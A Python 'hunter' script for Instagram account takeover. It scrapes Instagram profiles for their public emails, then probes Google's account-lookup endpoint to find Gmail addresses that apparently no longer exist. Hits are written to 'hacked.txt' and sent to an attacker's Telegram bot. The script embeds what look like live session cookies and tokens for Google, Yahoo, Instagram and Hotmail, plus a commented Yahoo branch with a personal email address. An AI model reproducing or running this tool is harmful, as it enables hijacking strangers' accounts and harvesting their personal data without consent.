import requests
from time import sleep
import os
import re
import time,random
url_insta='https://www.instagram.com/accounts/login/ajax/'
head_insta={
            'authority': 'www.instagram.com',
            'method': 'POST',
            'path': '/accounts/login/ajax/',
            'scheme': 'https',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7',
            'content-length': '277',
            'content-type': 'application/x-www-form-urlencoded',
           'cookie': 'ig_did=D9AD55FF-D40F-4569-8F3D-72923D6B496D; mid=X-oMXwAEAAFsGP-VB_KrvTNjqpMV; ig_nrcb=1; datr=lbztX-QwAT9uM6uzLDWzbgof; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=45246725385; csrftoken=u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
           'origin': 'https://www.instagram.com',
           'referer': 'https://www.instagram.com/accounts/login/',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
           'x-csrftoken': 'u27l2skXxXS3smNyYh7bYQ7GZeC39zq5',
           'x-ig-app-id': '936619743392459',
           'x-ig-www-claim': '0',
           'x-instagram-ajax': '7a3a3e64fa87',
           'x-requested-with': 'XMLHttpRequest'
        }
url_mail ='https://account.mail.ru/api/v1/user/exists'

head_yahoo = {
       'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7',
'Connection': 'keep-alive',
'Content-Length': '1473',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Cookie': 'APID=UPc3d3670d-4b5f-11eb-a7e1-02d1afc78ffe; B=bm51ibtfuk9f6&b=3&s=mg; GUC=AQEBAgFgJvVhAEIgRwSQ; A3=d=AQABBOYl6l8CEAe853cNMY00SOK5GV8yFLsFEgEBAgH1JmAAYVxXb2UB_eMAAAcI5iXqX18yFLs&S=AQAAAsY2Umy_AzXB3XTbjrNEFe8; A1=d=AQABBOYl6l8CEAe853cNMY00SOK5GV8yFLsFEgEBAgH1JmAAYVxXb2UB_eMAAAcI5iXqX18yFLs&S=AQAAAsY2Umy_AzXB3XTbjrNEFe8; A1S=d=AQABBOYl6l8CEAe853cNMY00SOK5GV8yFLsFEgEBAgH1JmAAYVxXb2UB_eMAAAcI5iXqX18yFLs&S=AQAAAsY2Umy_AzXB3XTbjrNEFe8&j=WORLD; APIDTS=1618320890; AS=v=1&s=8Zi3DD4i&d=A6075a469|XYwcFuj.2SIZUGecF1nU4IVTuYnp4KI7disQpmahRn3c5Rd4wytkORe_RoCdU_S8apTA2HgP4MzBHS.DIx_fzPPSs3UPzf2Ngr_4FPeVWrUc_2XEfQlihl44qbSSFK6ZLzrELUb_3T37ofu6EH98ohydNDzL6_rmVpig6_EgXMFAyOH1M5q.OUVJysNjg6_1ij6bRgSbJWZ7JEMPEyaM8UEenWROcI_Q63zonfELDHQxbpmUQEcIXHXxLFD2.b2oxQ8EafbylEPrW01dnhtE5WO5U1LChmL.FGCxDgc55uFjI31DydzpltQ9BO8IpYeZHC2LllATYj8ZJzs.1MryfR9T2B7vcZjgnedPxPqYBCXyWkm1whHVB3eMUypol12aRUv3VWft_WTAfQxg8431QOLvdUUqavZpf_fIWIbA6PekC024zqPUwyw2zNSSUkfJdQD_ZVZCbrn7UPH9N609fg9bWZrXmMq4LXSk5KDgI1O7.pbyEbG.sDxWem3zcDNYUPNCTZYYbGSMI.T2o2EOYceE.XIC1hUPXKLV6NPxhmkPl314N8S.mkDT07NNvN2wctJwA3yU7KwIEohAbBn30hZbJRR2ovanpsQobr7iNMy_Ftkak0dsrlGEm3wDwOVe3IrRsDTBXsHQki9bslvuXMX.v31Q5C25HQ5T5CdVrRWe0FvX9qPEN4u7szKPWz.eKmMRek6f9AuOxM5sQJsz5855l8pQ7WF5hUx1GaAdf14Ko4tG7WdM55qlUdpa.xP2o_gvgbCwIy6uS1Y3coh7uUdhOBk5r06vzelPOAIdYcKbdXaUU_B7kkQXk8H9r8hHyH8nXRFBU3Z6ImhC9hiFs7j0Cg4zHBead7exu87x0co5w.v9yOpYQngT1zDxlJpd9qlcnpLvJz7_I1Yl8UYtSLqOSLRHody5KFK11ds-~A|B6076f2a3|8mv5Gin.2Spx_Q1Pw9QOIAvB87IH8Jtt7dDsTo6Wk709_7YdljlyVa1NIUcDlgUZyowDfgKrziRwXcmNNcyPryEZxYNPp8UCJwO7IfRL_3PihDw5g6Aa04vPpfPbW.uHzst43Zu1g1lvVIismTDPwH6DhrnhezmTC6IfYN_kgo.JWB3oGpUW6kjY81Y5ls9AFbALjFRSP9ZabTlNZHw4HX0Y7VSFSgMUrGA10sRi27D84Irv7e3PhMWZdyOqNtb6sNURO3Fe7kYxrSukCSD1BA1P2__1PZhia6cxMpPlK_wv8ZpSFZeUZCQUL0HG4ozL8tvxvlJocWH_b5fgN8ezYLqzgQKkn8AKF.YxlggsqGbGa3H39ZxaUPtflpsREIs1j5IRwAUY97yyNNQHt3ooY6lhqht_JlZujnxx2OD4C6y2lwzK4K9iPfJioHa_c4KWrd_dlJUP9MJ9MCBpQvLR8WDja.GWYxj_Af2py57qpBGA0jkJv7Rli.o1dZNO9lf14UkKbsRJ6IAQ7BVxt9xbBbsUwoECa9W_0KYdmwJdKRsj8fWhBTinIvHhTQiOlt7gr1g4FYFJDOW4cFugzVV5i2MfFUYVtKireswyYOWq83SnF2jGEA1VC2blHT6RLTWWf21kGt2JfNQ8tAVDnR785gZ.DjhYitNiosGPrHCqD8VTxCurzE4oCt3pgZRGujNtcqGvvn2SYAbq5awna5rTwOKZYirY9XkLCkMDEE76pZNTYYdqGyu1rkVeN7P9eVPkt6Ig1D6kYf7J9JpdOcoCg5.QeIHgrbEpwV2nchKWHCOGnAhHjx1m5gKQh9yuPnJLtbR5rVfXg4iWxrTIc2X8oIuyGzFNoihh2gzu7vR.yUpfIlLwhEOMXo6MoWMhlWvcNyRmZpVjj1r9uYlax4TV4WDm44r2CtXX_elU6Qh5OO3OdmTlbktb6M_vXHZMb8S1uWnyB3qdSuIPH3Fz29WoTIsdg0f5e0FAcV6GczZp~A|C6076f253|Kr2qCCP.2SrkdnW.0TFGP0y1JtGfG0JrWhwb_rcgnFTNtji2F_IRroT6jf5DJ2wOmP7e1YFWU1pXaz30r8ZhjWj0LkJjOvuw3KUjOKkQhtIECkVH4hbFjQGuOu7Gu4.9qg7kQ64jhovertBcj_m3C6gSG.yt73GecqyH.6IvKOwZxJo0w3vCVWnwWdwWifBl0sDokgL1j2AdQXWUaxMNsDOBhT_3GtVBiclMxGbBj_bf4gmzrSkLjyaAeEES9TXnE5IgpindiF29MUlXhpqMO9JghTodJsN6YaKc7BXRKUsonYBE6aii7WYy.xf8vl92gdXioVOfW9XA3tz3Sy2ou7SUFiyWGFnjNUvif4qPlFEl92WYQ8lY.yf45qCLcjIMkHM6UmMzXQ_7bUoiDW0kpkQszbN6GV5N8LOggpXedIvO3BT9LRPPvibTZvwJ99.G28F30ooMSRtB2Eywlev92PeIrB0paW5HbZ21s4BHrV4Lw6MxLlygl7TuN.W1XLal9ybPyphf82pJK3.pSEOAr8tjIhXLgyxvVzokE0jfUm44AZCcaTLPPMJzgBFp.oVXLcBhN3rTvUg48Mm7EtrWSwg92SBYSwkKwVp2Gx9SWuBIfjqxxBbcGygrVAyt5D2Wt.DRrBTVkZ7iUpZMHidaG8bL.biJ4V3LuFoUALm8LVt6phrGSn0jnLklhJAu.QZLprOt4rh7WGz6M4FvFGZYYVNy5jHvOdMBq3b6yRJA4fdPo3O4yPw941rBOTPaSulZcVWG_gIIEFHkPvru0jy19YyiqboFiAX9SsE99rYBzTqMaQg7cxcwhlu5stFqKUu2BkoJHPwNIf6fKlCOBmn7Mrs-~A',
'Host': 'login.yahoo.com',
'Origin': 'https://login.yahoo.com',
'Referer': 'https://login.yahoo.com/?.intl=us',
'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
'sec-ch-ua-mobile': '?0',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin',
'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
'X-Requested-With': 'XMLHttpRequest'
}
url_yahoo = 'https://login.yahoo.com/?'
head_mail= {

'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
'contenttype':'application/x-www-form-urlencoded; charset=UTF-8'


}

url_gmail='https://accounts.google.com/_/lookup/accountlookup?hl=ar&_reqid=32589&rt=j'
head_gmail ={
    'accept': '*/*',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'content-length': '3911',
		'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
		'cookie': 'OGPC=422038528-2:; SID=8Ae5CNXyYLku7h3Nhd6PmjEwsqpLep9sdfcDc_QeJT1m6pf_cFdWBefOdFWBrRatzQzoTw.; __Secure-3PSID=8Ae5CNXyYLku7h3Nhd6PmjEwsqpLep9sdfcDc_QeJT1m6pf_LWBgOEuV0LWH29_CLb3l1g.; HSID=A8KaTqMCOG6xpfvsz; SSID=AtYd81IgyZuE9EbfE; APISID=E3Psm5Uangi4fH9M/AkOnPYEUZWnD-tnA_; SAPISID=iN7Q0OqbHZcyy5FL/Aerh1_4xeYlLJY4Hq; __Secure-3PAPISID=iN7Q0OqbHZcyy5FL/Aerh1_4xeYlLJY4Hq; ACCOUNT_CHOOSER=AFx_qI6QfbFWoV6PV6XKN_T6BDu29QAEvMrEZsoAl1r4bDBfnWApbNKbPlRCbFUWBfZ_IufZlpgrXPJIQyLZtlrdzhTBLG1ugbS2CJ2q9HNMMkzfgeaXgctISpVwNdXddAWu4ZnL0x6TC4OCJGrmngsaE5GSmcovCQ; LSID=o.myaccount.google.com|s.youtube:8Ae5CGkVX0iajA0zvRf3mhX7pmhByOogOBptOhnbeOOuoJS6lsMzh7eIoJ7jRz_OOQU1DQ.; SEARCH_SAMESITE=CgQImZIB; __Host-3PLSID=doritos|o.myaccount.google.com|s.youtube:8Ae5CGkVX0iajA0zvRf3mhX7pmhByOogOBptOhnbeOOuoJS6ByLMNjL9oNzA97kBg7BANg.; 1P_JAR=2021-03-29-09; NID=212=i268DCPkYi3AzR0f25yIGeJwDvI9KnX0IkpB6-jLiMgIkylu-ok0FxsNwgb77pnNf9P1dRbBa0rwmwoo3rBZLPEqBaYbIUTYOqnGXlodQyFP6PiO7x1DARyLyIg2nH_J_J208rXWq1sLL7oP_YSeJFznofwfpsHamypEYMgwPx2rU9UJJ59txYOFOliHngVgrmyLeujCj_dKNV8hrTJDFTTVfnxZG68C; __Host-GAPS=1:BWYU84SbcmvuPTxMnLb_Bw1WhSze11euoEbasRquyke84p3z6kKhM4STn2l2KqDaXmLnjmuLAu5YjxpgPYYS2MAbFJoYEA:8QsfUKnQPG8GNFFh; SIDCC=AJi4QfGikn_BfUsmrNc_AQgbrwCzKzaBTYlqHvZ_vt7pRS98qOGuitJ1M1_khzvPELS_owtDIQ; __Secure-3PSIDCC=AJi4QfH3OD5jfNAacCFyT0_heunei0GLdQymhUmRU8zPB7R7Svse8_GiuWLuXbaSblXAYlq-7bU',
		'google-accounts-xsrf': '1',
		'origin': 'https://accounts.google.com',
		'referer': 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fadssettings.google.com%2Fauthenticated%3Fref%3Dyt_auth%26pli%3D1&ec=GAlAmQM&flowName=GlifWebSignIn&flowEntry=AddSession',
		'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
		'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=eaa94017-90e6-4761-a779-143e63ce180a,sync_account_id=116486990055578668701,signin_mode=all_accounts,signout_mode=show_confirmation',
		'x-client-data': 'CJa2yQEIo7bJAQjEtskBCKmdygEIlqzKAQiIucoBCIbCygEI+MfKAQjx6soBCLGaywEI1JzLAQjjnMsBCKmdywEY4ZrLAQ==',
		'Decoded':
		'message ClientVariations {// Active client experiment variation IDs. repeated int32 variation_id = [3300118, 3300131, 3300164, 3313321, 3315222, 3316872, 3318022, 3318776, 3323249, 3329329, 3329620, 3329635, 3329705]; // Active client experiment variation IDs that trigger server-side behavior. repeated int32 trigger_variation_id = [3329377];}',
		'x-same-domain': '1'
}

head_hotmail = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}

def userone():
    head = {
        
        'User-agent':'Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550'
    }
    fff = open("id.txt","w")
    
    os.system("clear")
    print("TYPE USERNAME ")
    print("\n------------------")
    x = input("username :")
    url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+x+"&count=500"
    get = requests.get(url,headers=head)
    g = re.compile(r'"pk":"(.*?)"')
    gs = g.findall(get.text)
    for x in gs:
        fff.write(x+"\n")

def usernamee():
    head = {
        
        'User-agent':'Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550'
    }
    filer = open("id.txt","w")
    cvv = []
    os.system("cls")
    print("Press CTRL + C THEN ENTER TO STROP ADD KEYWORD")
    print("-----------------------------------")
    while True:
        
        try:
            user = input("username :")
            cvv.append(user)
        except:
            break
    for x in cvv:
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+x+"&count=500"
        get = requests.get(url,headers=head)
        g = re.compile(r'"pk":"(.*?)"')
        gs = g.findall(get.text)
        for x in gs:
            filer.write(x+"\n")

def nouser():
	os.system("clear")
	print(" [ + ] Pleas Wait  for Drop name !")
	time.sleep(3)
	font = open("user.txt","w")
	hhbezarm = open("name.txt","r").readlines()
	x90 = random.choice(hhbezarm)
	x91 = random.choice(hhbezarm)
	x92 = random.choice(hhbezarm)
	x93 = random.choice(hhbezarm)
	x94 = random.choice(hhbezarm)
	x95 = random.choice(hhbezarm)
	x96 = random.choice(hhbezarm)
	x97 = random.choice(hhbezarm)
	x98 = random.choice(hhbezarm)
	x99 = random.choice(hhbezarm)
	x100 = random.choice(hhbezarm)
	x101 = random.choice(hhbezarm)
	x102 = random.choice(hhbezarm)
	x103 = random.choice(hhbezarm)
	x104 = random.choice(hhbezarm)
	xduble = x90+x91+x92+x94+x95+x96+x97+x98+x99+x100+x101+x102+x103+x104
	#print(xduble)
	font.write(xduble)
	
	#print(x104)
	#exit()
#nouser()
        
def cheker():
    hackedd = open("hacked.txt","w")
    bmzhay = open("telgramId.txt","r").readlines()
    bey = open("Tokenbot.txt","r").readlines()
    for telgramakaw in bmzhay:
    	pass
    for tokenakaw  in bey:
    	pass
    
    
    
    	
    os.system("clear")
    count = 0
    notcount = 0
    nott = 0
    logg = open('login.txt','r').readlines()
    logg2 = open('login2.txt' , 'r').readlines()
    for chawm in logg:
        kora = chawm.strip()
    for chawm2 in logg2:
        kora2 = chawm2.strip()
    username =kora
    password = kora2
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '274',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; rur=VLL; csrftoken=Iwq1hnXNJ3Y8IH1fRYDND6r72Zezq28I',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
    'x-csrftoken': 'Iwq1hnXNJ3Y8IH1fRYDND6r72Zezq28I',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9J8a',
    'x-instagram-ajax': '1cb44f68ffec',
    'x-requested-with': 'XMLHttpRequest'
    }
    data = {
    'username': username,
    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1613212725:'+password,
    'queryParams': '{}',
    'optIntoOneTap': 'false'
    }
    r = requests.session()
    req_login = requests.post(url, data=data, headers=headers)
    if '"authenticated":true' in req_login.text:
        print(req_login.cookies)
        print('\033[1;32m[+] Login Successfully  ..')
    else:
        print('\033[0;31m[+] Faild Login\x1b[0m')
        exit()
    headrs = {'user-agent':'Instagram 9.7.0 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-N920P; nobleltespr; samsungexynos7420; ar_IQ)'}
    xxx = open("id.txt",'r').readlines()
    os.system("clear")
    
    for x in xxx:
        
        u = x.strip()
        time.sleep(4)
        url = "https://i.instagram.com/api/v1/users/" + u + "/info/"
        get = r.get(url, headers=headrs, cookies=req_login.cookies)
    
        ani = re.compile(r'"username":"(.*?)"')
        hama = re.compile(r'"public_email":"(.*?)"')
        baha = re.compile(r'"follower_count":(.*?),')
        lord = re.compile(r'"following_count":(.*?),')
        lordd = lord.findall(get.text)
        lora = re.compile(r'"is_verified":(.*?),')
        loraa = lora.findall(get.text)
        anii = ani.findall(get.text)
        hamaa=hama.findall(get.text)
        bahaa = baha.findall(get.text)
        for awen1 in anii:
            pass
        for awen2 in bahaa:
            pass
        for awen3 in lordd:
            pass
        for awen4 in loraa:
            pass
        for xd in hamaa:
           
            pass

            
            if '@gmail.com' in xd:
               
                data_insta={
        'username': xd,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
                }
                day = requests.post(url_insta,headers=head_insta,data=data_insta).text

                if '"message":"There was an error with your request. Please try again."' in day:
                    global head_gmail
                    data_gmail = {
		'continue': 'https://adssettings.google.com/authenticated?ref=yt_auth&pli=1',
		'f.req': f'["{xd}","AEThLlw6VGsyn2_pe-f86vgMSUv6HW6cl7s3ftZAG2KM59m7HtlMteSbiMd1cXodMV9ao2r-etLvEFwNOT1gmDeaWFo3pqVs2c8soJREt0Nt6O_RSxudYIUsivz-edV1f8qX-zBOsY7YMWaow-mczgAPFsOkLBibmlmgwm2DK_Mq4qKUpR1tG4YpAzApopzlBEgFAymMMus8",[],null,"US",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/AddSession?continue=https%3A%2F%2Fadssettings.google.com%2Fauthenticated%3Fref%3Dyt_auth%26pli%3D1&ec=GAlAmQM",null,[],4,[],"GlifWebSignIn",null,[]],10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"eaa94017-90e6-4761-a779-143e63ce180a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,true],"{xd}",null,null,null,true,true,[]]',
		'bgRequest': '["identifier","!XV6lXhPNAAY7smA8O7JCzxWNYzZtiS87ACkAIwj8RuOTLVLxGJigVpDhaC2z7ynSG4_C6vg2kxXAWOp26z7eH2IZogIAAAB9UgAAAB5oAQeZBBMPBNZpIQ75l0BgkmrzBFCvhfOdp8Lin14ikTnA1WsoaIfdlfYG6MYQnjc1UrPRJa74ZxDpu1BFftPI0nN7EOnM4ZS18dsZejZRwZBLtKG8QP0Q-GJEOZbq2-r2fqHe3GZb5Z7NW4rUeCLKfwsV7Tb8fuzfYlpZ_40Mw5S4Gk1C7BL4MOhtd3GE_62Qp-RuqLoqIvv5XIqMbLq6v0PjY6cUg5wg3cN4n3dF26kVWJYtS8vpVd5kBtydVCgidSNhN4ARi9Lk5TocNbPYonI5sm-7sJ0UGHI7wT4OFXJeKK_FgVxjXWI2FpFSrEPhgZahdfMB94LMNK-8eMIJKLTR-eOtu6l6TB3KVZEthoN_M0pvQHPcfAhLb0EB5tfkrcdZiMhOCGIZuCBmjzkog2_DV0Mw8Im5hMuTm8qrmX7i-lzWEmuuuYW5FGKDUraHZ0A0EmvWRaw7uMII2ScdpcXWUI6JGEjZYgGmOoTgMWVmUU0HTKuwLYkJvYxV89EdOjdtEjqfnlEl9WC21RfSxIt3mMkr9orJdP4opSk6neVuFTvvRD53NZ9iNboauX0Epe0IFa6NvidBSHLXIiaC92VUeNE08EaGEMXcy45ffg2BYsxmyu4DWRIoPcr0t1IrWdhwc1srOguxWl0mBs6QYeyLBc4CNRVglRFm3nklWlIE31g8GahYNLQnAxeljgp_WKEXda5VQm6WkDGcYGPbRf3bfxYqbJircIPhcOEYXzk8BQ9gJq9i3t3zX3qFg9U9B3skBRK4JgGKwzVWGjrw6K5G9uIOFsmXdPq7pdQE_tQ-PMPkuUPNoIZb98lu6reUbBEDHWfnpaiY6tjtTg0fcQW0kzrUN5kwJz7L47KpDYij4K3Y-hWN4vXJAFrbAHazlYZ4THHYrQDxeITF0MP6vweiyoful6H_YArrwliPX_7kswLE1MYOR_i5KwYlJEi9dMz1nSzyRynLSthBsez-zQYhlbt5Xhi8NuL3dRMxM8zRj2yw71sYdKjsX_AvNz0JX0v6W6eQSv6pVwyNAscdFsBcNt2N3xvwy0YUiFwIud5ypZe_MeWd8aByk4cce21tpZN8FDa4j6b2CGXPVpaVC7IZjCh0h_cXfFPoNONzD9roDpmOKzCrTj_q6xNPhtwY8vWdTV0CaJJbcm_ra3rp3FF0x6Hws5KZl9KpeRanphhtuiT90e-49V2AYdmbdlXgtZqJBswKwOOZhYUcw_33Q8t27ZXtiKxW2ieUv3fwvJ9Dz8l9pttsavtYUZ_mX6mN-PU4orT89JgeUDqimD91YI6Yx7KyoYlRbe7hYWNMzo0RAuuoElDr6GyTgf7pZC67XYQKm3-J3Obuja9iac7IeN7KaScI7uGcFV9gNhvP8j6evm9zws5Dlw"]',
		'at': 'AFoagUW_q8bXR45ZgAOS4A5fq9dVpQpMBQ:1617008567951',
		'azt': 'AFoagUW9q50Z3AnyfPsppwG7DjGdRvSUMQ:1617008567952',
		'cookiesDisabled': 'false',
		'deviceinfo': '[null,null,null,[],null,"US",null,null,[],"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"eaa94017-90e6-4761-a779-143e63ce180a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,[],[]],null,null,null,null,null,null,[],null,null,null,[],[]],null,null,null,null,2,null,false]',
		'gmscoreversion': 'undefined',
		'checkConnection': 'youtube:142:0',
		'checkedDomains': 'youtube',
		'pstMsg': '1'
                    }
                    global url_gmail
                    novemer = requests.post(url=url_gmail,headers=head_gmail,data=data_gmail)
                    if '["e",3,null,null,417]' in novemer.text:
                        os.system("clear")
                        ani =' <>----------danyar----------<>\nusername :'+awen1+'\nFollowers :'+awen2+'\nFollowing :'+awen3+'\nEmail :'+xd+'\nIsverified :'+awen4+'\n\n--> By:@danyarsoftware'
                        
                        url = f'https://api.telegram.org/bot{tokenakaw}/sendMessage?chat_id={telgramakaw}&text={ani}'
                        bnr = requests.get(url)
                        count+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        print("NOT BUSSINCE :"+str(nott))
                        hackedd.write(ani)
                    elif '["e",3,null,null,439]' in novemer.text:
                        os.system("clear")
                        ani2 =' <>----------danyar----------<>\nusername :'+awen1+'\nFollowers :'+awen2+'\nFollowing :'+awen3+'\nEmail :'+xd+'\nIsverified :'+awen4+'\n\n--> By:@danyarsoftware'

                        send_text2 =f'https://api.telegram.org/bot{tokenakaw}/sendMessage?chat_id={telgramakaw}&text={ani2}'
                        response2 = requests.get(send_text2)
                        count+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        print("NOT BUSSINCE :"+str(nott))
                        hackedd.write(ani2)
                    else:
                        os.system("clear")
                        notcount+=1
                        print("--------- TOOL HUNTER V2--------")
                        print("MY INSTAGRAM :Danyar.software")
                        print("MY TELGRAM :Danyarsoftware")
                        print("\nSTARTED PLEAS WAIT ..")
                        print("======================================")
                        print("VAILD :"+str(count))
                        print("NOT VAAILD  :"+str(notcount))
                        print("NOT BUSSINCE :"+str(nott))
                    

          #  if '@yahoo.com' in xd:
            
          #      global head_yahoo
    #            global url_yahoo
          #      data_insta={
    #    'username': xd,
   #     'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
#        'queryParams': '{}',
 #       'optIntoOneTap': 'false'
        #        }
          #      day2 = requests.post(url=url_insta,headers=head_insta,data=data_insta).text
                
            
            #    if '"message":"There was an error with your request. Please try again."' in day2:
                    
         #           data_yahoo = {
    #browser-fp-data: {"language":"en-US","colorDepth":24,"deviceMemory":2,"pixelRatio":1,"hardwareConcurrency":4,"timezoneOffset":-180,"timezone":"Asia/Baghdad","sessionStorage":1,"localStorage":1,"indexedDb":1,"openDatabase":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unknown","plugins":{"count":3,"hash":"e43a8bc708fc490225cde0663b28278c"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~ANGLE (Intel(R) HD Graphics Direct3D9Ex vs_3_0 ps_3_0)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":49,"hash":"411659924ff38420049ac402a30466bc"},"audio":"124.04347527516074","resolution":{"w":"1366","h":"768"},"availableResolution":{"w":"728","h":"1366"},"ts":{"serve":1618210850119,"render":1618210851202}}
#'crumb': 'Z1C8TjYGMDv',
#'acrumb': '8Zi3DD4i',
#'sessionIndex': 'Qw--',
#'displayName':'', 
#'deviceCapability': '{"pa":{"status":false}}',
#'username': 'lina443@yahoo.com',
#'passwd':'', 
#'signin': 'Next',
#'persistent': 'y'
#}

                  #  aah = requests.post(url=url_yahoo,headers=head_yahoo,data=data_yahoo)
                 #   print(aah.text)
                #    time.sleep(4)
                    
                    
                    
                #    if '"errorMsg"' in aah.text:
    #                    os.system('clear')
         #               dani2 = '<>----------danyar----------<>\nusername :'+awen1+'\nFollowers :'+awen2+'\nFollowing :'+awen3+'\nEmail :'+xd+'\nIsverified :'+awen4+'\n\n--> By:@danyarsoftware'

